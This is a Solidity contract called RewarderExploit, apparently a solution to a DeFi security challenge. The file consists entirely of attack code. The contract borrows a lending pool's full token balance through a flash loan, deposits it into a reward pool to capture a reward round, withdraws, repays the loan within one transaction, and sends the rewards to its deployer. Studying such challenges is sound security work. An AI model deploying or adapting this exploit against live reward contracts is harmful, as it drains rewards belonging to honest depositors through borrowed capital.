// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import "hardhat/console.sol";

interface IRewardPool {
    function deposit(uint256 amountToDeposit) external;

    function withdraw(uint256 amountToWithdraw) external;
}

interface IFlashloanPool {
    function flashLoan(uint256 amount) external;
}

contract RewarderExploit {
    IRewardPool _rewardPool;
    IFlashloanPool _loanPool;
    IERC20 _token;
    address _owner;

    constructor(
        IRewardPool _p1,
        IFlashloanPool _p2,
        IERC20 _t
    ) {
        _rewardPool = _p1;
        _loanPool = _p2;
        _token = _t;
        _owner = msg.sender;
    }

    function attack(IERC20 _rewardToken) external {
        // loan all tokens
        _loanPool.flashLoan(_token.balanceOf(address(_loanPool)));
        // transfer rewards which we got from calling deposit function in the callback
        _rewardToken.transfer(_owner, _rewardToken.balanceOf(address(this)));
    }

    function receiveFlashLoan(uint256 _amount) external {
        //approve and deposit
        _token.approve(address(_rewardPool), _amount);
        _rewardPool.deposit(_amount);
        
        //withdraw and return the loan
        _rewardPool.withdraw(_amount);
        _token.transfer(address(_loanPool), _amount);
    }
}
